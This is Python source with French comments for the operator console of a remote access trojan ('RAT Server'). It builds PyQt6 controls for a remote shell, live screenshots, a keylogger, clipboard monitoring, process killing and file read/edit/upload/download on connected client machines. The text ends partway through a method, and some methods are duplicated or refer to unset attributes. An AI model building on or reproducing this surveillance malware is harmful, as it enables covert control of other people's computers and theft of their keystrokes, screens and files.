# -*- coding: utf-8 -*-
import sys
import socket
import json
import threading
import queue
from PyQt6.QtWidgets import (QApplication, QMainWindow, QWidget, QVBoxLayout,
                            QHBoxLayout, QPushButton, QLabel, QTabWidget,
                            QTableWidget, QTableWidgetItem, QSlider, QGroupBox,
                            QLineEdit, QFileDialog, QMessageBox, QInputDialog,
                            QTextEdit, QScrollArea, QHeaderView)
from PyQt6.QtCore import Qt, QTimer, QObject, pyqtSignal, QUrl
from PyQt6.QtGui import QImage, QPixmap
from PyQt6.QtMultimedia import QMediaPlayer, QAudioOutput
from PyQt6.QtMultimediaWidgets import QVideoWidget
import psutil
from cryptography.fernet import Fernet
import base64
import os
from datetime import datetime
import mimetypes
import shutil
import time
from pathlib import Path

class SignalHandler(QObject):
    file_content_received = pyqtSignal(str, str)  # addr, content
    file_list_received = pyqtSignal(str, list)    # addr, entries
    screenshot_received = pyqtSignal(str, str)     # addr, data
    system_info_received = pyqtSignal(str, dict)   # addr, info
    process_list_received = pyqtSignal(str, list)  # addr, processes
    keylog_received = pyqtSignal(str, str)  # addr, key
    clipboard_received = pyqtSignal(str, str)  # addr, content

class MediaViewer(QWidget):
    def __init__(self, parent=None):
        super().__init__(parent)
        self.layout = QVBoxLayout(self)
        self.zoom_factor = 1.0
        
        # Image viewer
        self.image_label = QLabel()
        self.image_label.setAlignment(Qt.AlignmentFlag.AlignCenter)
        
        # Scroll Area pour l'image
        self.scroll_area = QScrollArea()
        self.scroll_area.setWidget(self.image_label)
        self.scroll_area.setAlignment(Qt.AlignmentFlag.AlignCenter)
        self.scroll_area.setWidgetResizable(True)
        self.layout.addWidget(self.scroll_area)
        
        # Contr√¥les de zoom pour les images
        zoom_controls = QHBoxLayout()
        self.zoom_in_btn = QPushButton("Zoom +")
        self.zoom_out_btn = QPushButton("Zoom -")
        self.reset_zoom_btn = QPushButton("Reset Zoom")
        self.zoom_in_btn.clicked.connect(lambda: self.zoom_image(1.2))
        self.zoom_out_btn.clicked.connect(lambda: self.zoom_image(0.8))
        self.reset_zoom_btn.clicked.connect(self.reset_zoom)
        
        zoom_controls.addWidget(self.zoom_in_btn)
        zoom_controls.addWidget(self.zoom_out_btn)
        zoom_controls.addWidget(self.reset_zoom_btn)
        
        self.zoom_controls = QWidget()
        self.zoom_controls.setLayout(zoom_controls)
        self.layout.addWidget(self.zoom_controls)
        self.zoom_controls.hide()
        
        # Video player
        self.video_widget = QVideoWidget()
        self.media_player = QMediaPlayer()
        self.audio_output = QAudioOutput()
        self.media_player.setVideoOutput(self.video_widget)
        self.media_player.setAudioOutput(self.audio_output)
        self.layout.addWidget(self.video_widget)
        self.video_widget.hide()
        
        # Contr√¥les m√©dia
        controls = QHBoxLayout()
        self.play_button = QPushButton("Play")
        self.play_button.clicked.connect(self.play_pause)
        self.stop_button = QPushButton("Stop")
        self.stop_button.clicked.connect(self.stop)
        self.volume_slider = QSlider(Qt.Orientation.Horizontal)
        self.volume_slider.setRange(0, 100)
        self.volume_slider.setValue(50)
        self.volume_slider.valueChanged.connect(self.set_volume)
        
        controls.addWidget(self.play_button)
        controls.addWidget(self.stop_button)
        controls.addWidget(QLabel("Volume:"))
        controls.addWidget(self.volume_slider)
        
        self.controls_widget = QWidget()
        self.controls_widget.setLayout(controls)
        self.layout.addWidget(self.controls_widget)
        self.controls_widget.hide()

    def show_image(self, data):
        self.original_image = QImage.fromData(data)
        if not self.original_image.isNull():
            self.update_image_display()
            self.video_widget.hide()
            self.scroll_area.show()
            self.zoom_controls.show()
            self.controls_widget.hide()

    def update_image_display(self):
        if hasattr(self, 'original_image'):
            # Calculer la taille disponible
            available_width = self.scroll_area.width() - 20  # Marge pour les barres de d√©filement
            available_height = self.scroll_area.height() - 20
            
            # Calculer les dimensions de l'image
            image_width = self.original_image.width() * self.zoom_factor
            image_height = self.original_image.height() * self.zoom_factor
            
            # Redimensionner l'image en conservant le ratio
            scaled_pixmap = QPixmap.fromImage(self.original_image).scaled(
                int(image_width),
                int(image_height),
                Qt.AspectRatioMode.KeepAspectRatio,
                Qt.TransformationMode.SmoothTransformation
            )
            
            self.image_label.setPixmap(scaled_pixmap)
            
            # Ajuster la taille minimale du label pour √©viter la distorsion
            self.image_label.setMinimumSize(1, 1)

    def zoom_image(self, factor):
        self.zoom_factor *= factor
        self.update_image_display()

    def reset_zoom(self):
        self.zoom_factor = 1.0
        self.update_image_display()

    def resizeEvent(self, event):
        super().resizeEvent(event)
        self.update_image_display()

    def play_media(self, temp_file_path):
        self.media_player.setSource(QUrl.fromLocalFile(temp_file_path))
        self.scroll_area.hide()
        self.video_widget.show()
        self.controls_widget.show()
        self.play_button.setText("Pause")
        self.media_player.play()

    def play_pause(self):
        if self.media_player.playbackState() == QMediaPlayer.PlaybackState.PlayingState:
            self.media_player.pause()
            self.play_button.setText("Play")
        else:
            self.media_player.play()
            self.play_button.setText("Pause")

    def stop(self):
        self.media_player.stop()
        self.play_button.setText("Play")

    def set_volume(self, value):
        self.audio_output.setVolume(value / 100.0)

class RatServer(QMainWindow):
    def __init__(self):
        super().__init__()
        self.setWindowTitle("RAT Server")
        self.setGeometry(100, 100, 1200, 800)
        
        # Gestionnaire de signaux
        self.signal_handler = SignalHandler()
        self.signal_handler.file_content_received.connect(self.update_file_content)
        self.signal_handler.file_list_received.connect(self.update_file_list)
        self.signal_handler.screenshot_received.connect(self.update_screenshot)
        self.signal_handler.system_info_received.connect(self.update_system_info)
        self.signal_handler.process_list_received.connect(self.update_process_list)
        self.signal_handler.keylog_received.connect(self.update_keylog)
        self.signal_handler.clipboard_received.connect(self.update_clipboard)
        
        # Initialisation des variables
        self.clients = {}
        self.selected_client = None
        self.screenshot_interval = 100
        self.server_running = True
        self.command_queue = queue.Queue()
        self.current_paths = {}  # Stocke le chemin actuel pour chaque client
        
        # Ajouter le dossier temporaire pour les fichiers m√©dias
        self.temp_dir = os.path.join(os.path.dirname(__file__), "temp")
        os.makedirs(self.temp_dir, exist_ok=True)
        
        # Cr√©ation de l'interface
        self.init_ui()
        
        # D√©marrage du serveur
        self.start_server()
        
    def init_ui(self):
        # Widget central
        central_widget = QWidget()
        self.setCentralWidget(central_widget)
        layout = QVBoxLayout(central_widget)
        
        # Barre d'√©tat
        status_layout = QHBoxLayout()
        self.status_label = QLabel("Status: Running")
        self.toggle_button = QPushButton("Stop Server")
        self.toggle_button.clicked.connect(self.toggle_server)
        status_layout.addWidget(self.status_label)
        status_layout.addStretch()
        status_layout.addWidget(self.toggle_button)
        layout.addLayout(status_layout)
        
        # Onglets
        tabs = QTabWidget()
        
        # Onglet Overview
        overview_tab = QWidget()
        overview_layout = QVBoxLayout(overview_tab)
        
        stats_group = QGroupBox("Statistics")
        stats_layout = QVBoxLayout()
        self.clients_count = QLabel("Connected Clients: 0")
        self.uptime_label = QLabel("Server Uptime: 0:00:00")
        stats_layout.addWidget(self.clients_count)
        stats_layout.addWidget(self.uptime_label)
        stats_group.setLayout(stats_layout)
        overview_layout.addWidget(stats_group)
        
        tabs.addTab(overview_tab, "üìä Overview")
        
        # Onglet Clients
        clients_tab = QWidget()
        clients_layout = QVBoxLayout(clients_tab)
        
        self.clients_table = QTableWidget()
        self.clients_table.setColumnCount(6)
        self.clients_table.setHorizontalHeaderLabels(
            ["Address", "Hostname", "OS", "CPU", "Memory", "Status"])
        self.clients_table.itemClicked.connect(self.on_client_selected)
        clients_layout.addWidget(self.clients_table)
        
        tabs.addTab(clients_tab, "üë• Clients")
        
        # Onglet Commands
        commands_tab = QWidget()
        commands_layout = QVBoxLayout(commands_tab)
        
        # Contr√¥les de capture d'√©cran
        screenshot_group = QGroupBox("Screenshot Controls")
        screenshot_layout = QVBoxLayout()
        
        interval_layout = QHBoxLayout()
        interval_layout.addWidget(QLabel("Interval (ms):"))
        self.interval_slider = QSlider(Qt.Orientation.Horizontal)
        self.interval_slider.setRange(50, 1000)
        self.interval_slider.setValue(100)
        self.interval_slider.valueChanged.connect(self.update_interval)
        interval_layout.addWidget(self.interval_slider)
        
        buttons_layout = QHBoxLayout()
        self.start_screenshot_btn = QPushButton("Start Screenshot")
        self.stop_screenshot_btn = QPushButton("Stop Screenshot")
        self.start_screenshot_btn.clicked.connect(self.start_screenshot)
        self.stop_screenshot_btn.clicked.connect(self.stop_screenshot)
        buttons_layout.addWidget(self.start_screenshot_btn)
        buttons_layout.addWidget(self.stop_screenshot_btn)
        
        screenshot_layout.addLayout(interval_layout)
        screenshot_layout.addLayout(buttons_layout)
        screenshot_group.setLayout(screenshot_layout)
        commands_layout.addWidget(screenshot_group)
        
        # Affichage de la capture d'√©cran
        self.screenshot_label = QLabel()
        self.screenshot_label.setAlignment(Qt.AlignmentFlag.AlignCenter)
        commands_layout.addWidget(self.screenshot_label)
        
        # Contr√¥les du shell
        shell_group = QGroupBox("Shell Controls")
        shell_layout = QVBoxLayout()
        
        # Zone de commande shell
        shell_command_layout = QHBoxLayout()
        self.shell_command = QLineEdit()
        self.shell_command.setPlaceholderText("Enter shell command...")
        self.shell_command.returnPressed.connect(self.send_shell_command)
        shell_command_layout.addWidget(self.shell_command)
        
        # Boutons de contr√¥le shell
        shell_buttons_layout = QHBoxLayout()
        self.start_shell_btn = QPushButton("Start Shell")
        self.stop_shell_btn = QPushButton("Stop Shell")
        self.start_shell_btn.clicked.connect(self.start_shell)
        self.stop_shell_btn.clicked.connect(self.stop_shell)
        shell_buttons_layout.addWidget(self.start_shell_btn)
        shell_buttons_layout.addWidget(self.stop_shell_btn)
        
        # Zone d'affichage de la sortie shell
        self.shell_output = QTextEdit()
        self.shell_output.setReadOnly(True)
        
        shell_layout.addLayout(shell_command_layout)
        shell_layout.addLayout(shell_buttons_layout)
        shell_layout.addWidget(self.shell_output)
        shell_group.setLayout(shell_layout)
        commands_layout.addWidget(shell_group)
        
        tabs.addTab(commands_tab, "‚å®Ô∏è Commands")
        
        # Onglet Process Manager
        process_tab = QWidget()
        process_layout = QVBoxLayout(process_tab)
        
        # Table des processus
        self.process_table = QTableWidget()
        self.process_table.setColumnCount(5)
        self.process_table.setHorizontalHeaderLabels(["PID", "Name", "CPU %", "Memory %", "Status"])
        process_layout.addWidget(self.process_table)
        
        # Boutons de contr√¥le des processus
        process_controls = QHBoxLayout()
        self.refresh_proc_btn = QPushButton("Refresh")
        self.kill_proc_btn = QPushButton("Kill Process")
        self.start_proc_btn = QPushButton("Start Process")
        
        self.refresh_proc_btn.clicked.connect(self.refresh_processes)
        self.kill_proc_btn.clicked.connect(self.kill_process)
        self.start_proc_btn.clicked.connect(self.start_process)
        
        process_controls.addWidget(self.refresh_proc_btn)
        process_controls.addWidget(self.kill_proc_btn)
        process_controls.addWidget(self.start_proc_btn)
        process_layout.addLayout(process_controls)
        
        tabs.addTab(process_tab, "‚öôÔ∏è Processes")
        
        # Onglet Monitoring
        monitoring_tab = QWidget()
        monitoring_layout = QVBoxLayout(monitoring_tab)
        
        # Keylogger
        keylogger_group = QGroupBox("Keylogger")
        keylogger_layout = QVBoxLayout()
        
        self.keylog_text = QTextEdit()
        self.keylog_text.setReadOnly(True)
        
        keylogger_controls = QHBoxLayout()
        self.start_keylog_btn = QPushButton("Start Keylogger")
        self.stop_keylog_btn = QPushButton("Stop Keylogger")
        self.clear_keylog_btn = QPushButton("Clear Log")
        self.save_keylog_btn = QPushButton("Save Log")
        
        self.start_keylog_btn.clicked.connect(self.start_keylogger)
        self.stop_keylog_btn.clicked.connect(self.stop_keylogger)
        self.clear_keylog_btn.clicked.connect(self.clear_keylog)
        self.save_keylog_btn.clicked.connect(self.save_keylog)
        
        keylogger_controls.addWidget(self.start_keylog_btn)
        keylogger_controls.addWidget(self.stop_keylog_btn)
        keylogger_controls.addWidget(self.clear_keylog_btn)
        keylogger_controls.addWidget(self.save_keylog_btn)
        
        keylogger_layout.addWidget(self.keylog_text)
        keylogger_layout.addLayout(keylogger_controls)
        keylogger_group.setLayout(keylogger_layout)
        
        # Clipboard Monitor
        clipboard_group = QGroupBox("Clipboard Monitor")
        clipboard_layout = QVBoxLayout()
        
        self.clipboard_text = QTextEdit()
        self.clipboard_text.setReadOnly(True)
        
        clipboard_controls = QHBoxLayout()
        self.start_clipboard_btn = QPushButton("Start Monitoring")
        self.stop_clipboard_btn = QPushButton("Stop Monitoring")
        self.clear_clipboard_btn = QPushButton("Clear History")
        
        self.start_clipboard_btn.clicked.connect(self.start_clipboard_monitor)
        self.stop_clipboard_btn.clicked.connect(self.stop_clipboard_monitor)
        self.clear_clipboard_btn.clicked.connect(self.clear_clipboard)
        
        clipboard_controls.addWidget(self.start_clipboard_btn)
        clipboard_controls.addWidget(self.stop_clipboard_btn)
        clipboard_controls.addWidget(self.clear_clipboard_btn)
        
        clipboard_layout.addWidget(self.clipboard_text)
        clipboard_layout.addLayout(clipboard_controls)
        clipboard_group.setLayout(clipboard_layout)
        
        monitoring_layout.addWidget(keylogger_group)
        monitoring_layout.addWidget(clipboard_group)
        
        tabs.addTab(monitoring_tab, "üëÅ Monitoring")
        
        # Onglet File Explorer
        files_tab = QWidget()
        files_layout = QVBoxLayout(files_tab)
        
        # Barre de navigation
        nav_layout = QHBoxLayout()
        self.path_edit = QLineEdit()
        self.path_edit.returnPressed.connect(self.navigate_to_path)
        nav_layout.addWidget(QLabel("Path:"))
        nav_layout.addWidget(self.path_edit)
        nav_layout.addWidget(QPushButton("Go", clicked=self.navigate_to_path))
        files_layout.addLayout(nav_layout)
        
        # Liste des fichiers
        self.files_table = QTableWidget()
        self.files_table.setColumnCount(5)
        self.files_table.setHorizontalHeaderLabels(
            ["Name", "Type", "Size", "Modified", "Full Path"])
        self.files_table.setSelectionBehavior(QTableWidget.SelectionBehavior.SelectRows)
        self.files_table.itemDoubleClicked.connect(self.on_file_double_clicked)
        files_layout.addWidget(self.files_table)
        
        # Boutons d'action pour les fichiers
        file_actions = QHBoxLayout()
        self.read_btn = QPushButton("Read File")
        self.edit_btn = QPushButton("Edit File")
        self.rename_btn = QPushButton("Rename")
        self.download_btn = QPushButton("Download")
        self.upload_btn = QPushButton("Upload")
        
        self.read_btn.clicked.connect(self.read_file)
        self.edit_btn.clicked.connect(self.edit_file)
        self.rename_btn.clicked.connect(self.rename_file)
        self.download_btn.clicked.connect(self.download_selected_file)
        self.upload_btn.clicked.connect(self.upload_file)
        
        file_actions.addWidget(self.read_btn)
        file_actions.addWidget(self.edit_btn)
        file_actions.addWidget(self.rename_btn)
        file_actions.addWidget(self.download_btn)
        file_actions.addWidget(self.upload_btn)
        files_layout.addLayout(file_actions)
        
        # Zone de visualisation des fichiers
        file_view_layout = QHBoxLayout()
        
        # Zone de texte pour afficher/√©diter le contenu
        self.file_content = QTextEdit()
        self.file_content.setReadOnly(True)
        
        # Viewer multim√©dia
        self.media_viewer = MediaViewer()
        
        file_view_layout.addWidget(self.file_content)
        file_view_layout.addWidget(self.media_viewer)
        self.media_viewer.hide()
        
        files_layout.addLayout(file_view_layout)
        
        tabs.addTab(files_tab, "üìÅ Files")
        
        # Onglet Settings
        settings_tab = QWidget()
        settings_layout = QVBoxLayout(settings_tab)
        
        connection_group = QGroupBox("Connection Settings")
        connection_layout = QVBoxLayout()
        connection_layout.addWidget(QLabel("Server Address: 127.0.0.1:8080"))
        connection_layout.addWidget(QLabel("Encryption: AES-256-GCM"))
        connection_group.setLayout(connection_layout)
        settings_layout.addWidget(connection_group)
        
        tabs.addTab(settings_tab, "‚öôÔ∏è Settings")
        
        layout.addWidget(tabs)
        
        # Timer pour les mises √† jour
        self.update_timer = QTimer()
        self.update_timer.timeout.connect(self.update_ui)
        self.update_timer.start(1000)  # Update every second
        
    def start_server(self):
        self.server_thread = threading.Thread(target=self.server_loop)
        self.server_thread.daemon = True
        self.server_thread.start()
        
    def server_loop(self):
        try:
            server = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            server.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
            server.bind(('127.0.0.1', 8080))
            server.listen(5)
            print("Server started on 127.0.0.1:8080")
            
            while self.server_running:
                try:
                    client, addr = server.accept()
                    print(f"New client connected from {addr}")
                    client_thread = threading.Thread(
                        target=self.handle_client,
                        args=(client, addr)
                    )
                    client_thread.daemon = True
                    client_thread.start()
                except Exception as e:
                    if self.server_running:
                        print(f"Error accepting client: {e}")
                    break
                    
        except Exception as e:
            print(f"Server error: {e}")
        finally:
            try:
                server.close()
            except:
                pass
                
    def handle_client(self, client_socket, address):
        try:
            # Ajouter le client √† la liste avec son socket
            addr_str = f"{address[0]}:{address[1]}"
            if addr_str not in self.clients:
                self.clients[addr_str] = {
                    'socket': client_socket,
                    'hostname': 'Unknown',
                    'os': 'Unknown',
                    'cpu': 0.0,
                    'memory': 0.0,
                    'status': 'Connected'
                }
            else:
                self.clients[addr_str]['socket'] = client_socket
                self.clients[addr_str]['status'] = 'Connected'

            while True:
                size_bytes = client_socket.recv(8)
                if not size_bytes:
                    break
                    
                size = int.from_bytes(size_bytes, byteorder='big')
                data = b""
                while len(data) < size:
                    chunk = client_socket.recv(min(4096, size - len(data)))
                    if not chunk:
                        break
                    data += chunk
                
                if not data:
                    break
                    
                message = json.loads(data.decode())
                
                if message['type'] == 'system_info':
                    self.update_client_info(address, message['data'])
                elif message['type'] == 'directory_listing':
                    self.update_directory_listing(address, message['data'])
                elif message['type'] == 'file_content':
                    self.update_file_content(address, message['data'])
                elif message['type'] == 'search_results':
                    self.update_search_results(address, message['data'])
                elif message['type'] == 'process_list':
                    self.update_process_list(address, message['data'])
                elif message['type'] == 'keylog':
                    self.update_keylog(address, message['data'])
                elif message['type'] == 'clipboard':
                    self.update_clipboard(address, message['data'])
                elif message['type'] == 'screenshot':
                    self.update_screenshot(address, message['data'])
                elif message['type'] == 'shell_output':
                    self.update_shell_output(address, message['data'])
                elif message['type'] == 'file_data':
                    self.handle_file_data(address, message['data'])
                elif message['type'] == 'ok':
                    print(f"Client {address}: {message.get('message', 'Operation successful')}")
                elif message['type'] == 'error':
                    print(f"Client {address} error: {message.get('message', 'Unknown error')}")
                    
        except Exception as e:
            print(f"Error handling client {address}: {e}")
        finally:
            self.remove_client(address)
            client_socket.close()

    def update_screenshot(self, address, data):
        try:
            # D√©coder l'image base64
            image_data = base64.b64decode(data)
            
            # Cr√©er un dossier pour les captures d'√©cran si n√©cessaire
            screenshots_dir = os.path.join(self.download_path, "screenshots")
            os.makedirs(screenshots_dir, exist_ok=True)
            
            # G√©n√©rer un nom de fichier unique
            timestamp = time.strftime("%Y%m%d_%H%M%S")
            filename = f"screenshot_{address[0]}_{timestamp}.png"
            filepath = os.path.join(screenshots_dir, filename)
            
            # Sauvegarder l'image
            with open(filepath, 'wb') as f:
                f.write(image_data)
                
            print(f"Screenshot saved: {filepath}")
        except Exception as e:
            print(f"Error saving screenshot: {e}")

    def update_shell_output(self, address, data):
        try:
            # Cr√©er un dossier pour les logs shell si n√©cessaire
            shell_logs_dir = os.path.join(self.download_path, "shell_logs")
            os.makedirs(shell_logs_dir, exist_ok=True)
            
            # G√©n√©rer un nom de fichier unique
            timestamp = time.strftime("%Y%m%d_%H%M%S")
            filename = f"shell_{address[0]}_{timestamp}.txt"
            filepath = os.path.join(shell_logs_dir, filename)
            
            # Sauvegarder la sortie du shell
            with open(filepath, 'a', encoding='utf-8') as f:
                f.write(data)
                
            print(f"Shell output saved: {filepath}")
        except Exception as e:
            print(f"Error saving shell output: {e}")

    def start_screen_capture(self, address, interval=1000):
        try:
            self.send_command(address, {
                'type': 'command',
                'command': 'start_screen_capture',
                'interval': interval
            })
            print(f"Started screen capture for client {address}")
        except Exception as e:
            print(f"Error starting screen capture: {e}")

    def stop_screen_capture(self, address):
        try:
            self.send_command(address, {
                'type': 'command',
                'command': 'stop_screen_capture'
            })
            print(f"Stopped screen capture for client {address}")
        except Exception as e:
            print(f"Error stopping screen capture: {e}")

    def start_shell(self, address):
        try:
            self.send_command(address, {
                'type': 'command',
                'command': 'start_shell'
            })
            print(f"Started shell for client {address}")
        except Exception as e:
            print(f"Error starting shell: {e}")

    def stop_shell(self, address):
        try:
            self.send_command(address, {
                'type': 'command',
                'command': 'stop_shell'
            })
            print(f"Stopped shell for client {address}")
        except Exception as e:
            print(f"Error stopping shell: {e}")

    def send_shell_command(self, address, command):
        try:
            self.send_command(address, {
                'type': 'command',
                'command': 'shell_command',
                'command': command
            })
            print(f"Sent shell command to client {address}")
        except Exception as e:
            print(f"Error sending shell command: {e}")

    def update_ui(self):
        # Update clients count
        self.clients_count.setText(f"Connected Clients: {len(self.clients)}")
        
        # Update clients table
        self.clients_table.setRowCount(len(self.clients))
        for i, (addr, info) in enumerate(self.clients.items()):
            self.clients_table.setItem(i, 0, QTableWidgetItem(addr))
            self.clients_table.setItem(i, 1, QTableWidgetItem(info['hostname']))
            self.clients_table.setItem(i, 2, QTableWidgetItem(info['os']))
            self.clients_table.setItem(i, 3, QTableWidgetItem(f"{info['cpu']:.1f}%"))
            self.clients_table.setItem(i, 4, QTableWidgetItem(f"{info['memory']:.1f}%"))
            self.clients_table.setItem(i, 5, QTableWidgetItem(info['status']))
            
    def toggle_server(self):
        self.server_running = not self.server_running
        self.status_label.setText(f"Status: {'Running' if self.server_running else 'Stopped'}")
        self.toggle_button.setText('Start Server' if not self.server_running else 'Stop Server')
        
    def start_screenshot(self):
        if self.selected_client:
            self.start_screen_capture(self.selected_client, self.screenshot_interval)
            
    def stop_screenshot(self):
        if self.selected_client:
            self.stop_screen_capture(self.selected_client)
            
    def update_interval(self, value):
        self.screenshot_interval = value
        
    def update_screenshot(self, addr, data):
        try:
            image_data = base64.b64decode(data)
            image = QImage.fromData(image_data)
            if not image.isNull():
                pixmap = QPixmap.fromImage(image)
                if not pixmap.isNull():
                    scaled_pixmap = pixmap.scaled(
                        self.screenshot_label.size(),
                        Qt.AspectRatioMode.KeepAspectRatio,
                        Qt.TransformationMode.SmoothTransformation
                    )
                    self.screenshot_label.setPixmap(scaled_pixmap)
                    print(f"Screenshot updated for {addr}")
                else:
                    print(f"Failed to create pixmap for {addr}")
            else:
                print(f"Failed to create image for {addr}")
        except Exception as e:
            print(f"Error updating screenshot: {e}")
            
    def send_command(self, address, command):
        addr_str = f"{address[0]}:{address[1]}"
        if addr_str in self.clients:
            try:
                client = self.clients[addr_str]['socket']
                data = json.dumps(command).encode()
                size = len(data)
                client.sendall(size.to_bytes(8, byteorder='big'))
                client.sendall(data)
            except Exception as e:
                print(f"Error sending command to {addr_str}: {e}")
                self.remove_client(address)
                
    def on_client_selected(self, item):
        row = item.row()
        self.selected_client = self.clients_table.item(row, 0).text()
        if self.selected_client in self.current_paths:
            self.path_edit.setText(self.current_paths[self.selected_client])
            self.list_directory()
            
    def navigate_to_path(self):
        if self.selected_client:
            path = self.path_edit.text()
            self.current_paths[self.selected_client] = path
            self.list_directory()
            
    def list_directory(self):
        if self.selected_client:
            self.send_command(self.selected_client, {
                'type': 'command',
                'command': 'list_directory',
                'path': self.current_paths[self.selected_client]
            })
            
    def update_file_list(self, addr, entries):
        if addr == self.selected_client:
            self.files_table.setRowCount(len(entries))
            for i, entry in enumerate(entries):
                self.files_table.setItem(i, 0, QTableWidgetItem(entry['name']))
                self.files_table.setItem(i, 1, QTableWidgetItem("Directory" if entry['is_dir'] else "File"))
                self.files_table.setItem(i, 2, QTableWidgetItem(self.format_size(entry['size'])))
                self.files_table.setItem(i, 3, QTableWidgetItem(
                    datetime.fromtimestamp(entry['modified']).strftime('%Y-%m-%d %H:%M:%S')))
                self.files_table.setItem(i, 4, QTableWidgetItem(entry['path']))
            
    def format_size(self, size):
        for unit in ['B', 'KB', 'MB', 'GB']:
            if size < 1024:
                return f"{size:.1f} {unit}"
            size /= 1024
        return f"{size:.1f} TB"
        
    def open_directory(self, path):
        if self.selected_client:
            self.current_paths[self.selected_client] = path
            self.path_edit.setText(path)
            self.list_directory()
            
    def download_selected_file(self):
        file_info = self.get_selected_file()
        if file_info and file_info['type'] == "File":
            save_path, _ = QFileDialog.getSaveFileName(
                self,
                "Save File",
                os.path.basename(file_info['path'])
            )
            if save_path:
                self.send_command(self.selected_client, {
                    'type': 'command',
                    'command': 'download_file',
                    'path': file_info['path']
                })
                self.download_path = save_path

    def upload_file(self):
        if not self.selected_client:
            QMessageBox.warning(self, "Warning", "Please select a client first")
            return
            
        file_paths, _ = QFileDialog.getOpenFileNames(
            self,
            "Select Files to Upload",
            "",
            "All Files (*.*)"
        )
        
        if not file_paths:
            return
            
        for file_path in file_paths:
            try:
                with open(file_path, 'rb') as f:
                    data = f.read()
                    
                # Obtenir le nom du fichier et le chemin de destination
                file_name = os.path.basename(file_path)
                dest_path = os.path.join(self.current_paths[self.selected_client], file_name)
                
                # Envoyer la commande d'upload
                self.send_command(self.selected_client, {
                    'type': 'command',
                    'command': 'upload_file',
                    'path': dest_path,
                    'data': base64.b64encode(data).decode(),
                    'file_name': file_name
                })
                
                print(f"Uploading {file_name} to {dest_path}")
                
            except Exception as e:
                QMessageBox.critical(
                    self,
                    "Upload Error",
                    f"Failed to upload {os.path.basename(file_path)}: {str(e)}"
                )

    def create_directory(self):
        if self.selected_client:
            name, ok = QInputDialog.getText(self, "New Directory", "Enter directory name:")
            if ok and name:
                path = os.path.join(self.current_paths[self.selected_client], name)
                self.send_command(self.selected_client, {
                    'type': 'command',
                    'command': 'create_directory',
                    'path': path
                })
                
    def delete_file(self, path):
        if self.selected_client:
            reply = QMessageBox.question(
                self, "Confirm Delete",
                f"Are you sure you want to delete {os.path.basename(path)}?",
                QMessageBox.StandardButton.Yes | QMessageBox.StandardButton.No
            )
            if reply == QMessageBox.StandardButton.Yes:
                self.send_command(self.selected_client, {
                    'type': 'command',
                    'command': 'delete_file',
                    'path': path
                })
                
    def search_files(self):
        if self.selected_client:
            query, ok = QInputDialog.getText(self, "Search Files", "Enter search query:")
            if ok and query:
                self.send_command(self.selected_client, {
                    'type': 'command',
                    'command': 'search_files',
                    'query': query,
                    'path': self.current_paths[self.selected_client]
                })
                
    def resizeEvent(self, event):
        super().resizeEvent(event)
        if hasattr(self, 'screenshot_label') and self.screenshot_label.pixmap():
            scaled_pixmap = self.screenshot_label.pixmap().scaled(
                self.screenshot_label.size(),
                Qt.AspectRatioMode.KeepAspectRatio,
                Qt.TransformationMode.SmoothTransformation
            )
            self.screenshot_label.setPixmap(scaled_pixmap)
            
    def closeEvent(self, event):
        self.server_running = False
        for client in self.clients.values():
            try:
                client['socket'].close()
            except:
                pass
        
        # Nettoyer les fichiers temporaires
        try:
            shutil.rmtree(self.temp_dir)
        except:
            pass
        event.accept()

    def on_file_double_clicked(self, item):
        row = item.row()
        file_type = self.files_table.item(row, 1).text()
        path = self.files_table.item(row, 4).text()
        
        if file_type == "Directory":
            self.open_directory(path)
        else:
            self.read_file()

    def get_selected_file(self):
        selected = self.files_table.selectedItems()
        if selected and self.selected_client:
            row = selected[0].row()
            return {
                'name': self.files_table.item(row, 0).text(),
                'type': self.files_table.item(row, 1).text(),
                'path': self.files_table.item(row, 4).text()
            }
        return None

    def read_file(self):
        file_info = self.get_selected_file()
        if not file_info:
            return
            
        mime_type, _ = mimetypes.guess_type(file_info['path'])
        if not mime_type:
            mime_type = 'text/plain'
            
        if mime_type.startswith('image/'):
            self.file_content.hide()
            self.media_viewer.show()
            self.send_command(self.selected_client, {
                'type': 'command',
                'command': 'read_media',
                'path': file_info['path'],
                'mime_type': mime_type
            })
        elif mime_type.startswith(('audio/', 'video/')):
            self.file_content.hide()
            self.media_viewer.show()
            temp_path = os.path.join(self.temp_dir, os.path.basename(file_info['path']))
            self.temp_media_path = temp_path
            self.send_command(self.selected_client, {
                'type': 'command',
                'command': 'read_media',
                'path': file_info['path'],
                'mime_type': mime_type
            })
        else:
            self.media_viewer.hide()
            self.file_content.show()
            self.file_content.setReadOnly(True)
            self.send_command(self.selected_client, {
                'type': 'command',
                'command': 'read_file',
                'path': file_info['path']
            })

    def edit_file(self):
        file_info = self.get_selected_file()
        if file_info and file_info['type'] == "File":
            self.file_content.setReadOnly(False)
            self.edit_btn.setText("Save")
            self.edit_btn.clicked.disconnect()
            self.edit_btn.clicked.connect(self.save_file)

    def save_file(self):
        file_info = self.get_selected_file()
        if file_info and file_info['type'] == "File":
            content = self.file_content.toPlainText()
            self.send_command(self.selected_client, {
                'type': 'command',
                'command': 'write_file',
                'path': file_info['path'],
                'content': content
            })
            self.file_content.setReadOnly(True)
            self.edit_btn.setText("Edit File")
            self.edit_btn.clicked.disconnect()
            self.edit_btn.clicked.connect(self.edit_file)

    def rename_file(self):
        file_info = self.get_selected_file()
        if file_info:
            new_name = QInputDialog.getText(
                self, 
                "Rename",
                f"Enter new name for {file_info['name']}:",
                text=file_info['name']
            )[0]
            
            if new_name and new_name != file_info['name']:
                new_path = os.path.join(os.path.dirname(file_info['path']), new_name)
                self.send_command(self.selected_client, {
                    'type': 'command',
                    'command': 'rename',
                    'old_path': file_info['path'],
                    'new_path': new_path
                })

    def update_system_info(self, addr, info):
        if addr in self.clients:
            self.clients[addr].update(info)

    def update_file_content(self, addr, content):
        if addr == self.selected_client:
            self.file_content.setText(content)

    def handle_media_data(self, addr, data, mime_type):
        if addr != self.selected_client:
            return
            
        try:
            decoded_data = base64.b64decode(data)
            if mime_type.startswith('image/'):
                self.media_viewer.show_image(decoded_data)
            else:  # audio/video
                with open(self.temp_media_path, 'wb') as f:
                    f.write(decoded_data)
                self.media_viewer.play_media(self.temp_media_path)
        except Exception as e:
            print(f"Error handling media data: {e}")

    def refresh_processes(self):
        if self.selected_client:
            self.send_command(self.selected_client, {
                'type': 'command',
                'command': 'list_processes'
            })

    def kill_process(self):
        if not self.selected_client:
            return
            
        selected = self.process_table.selectedItems()
        if selected:
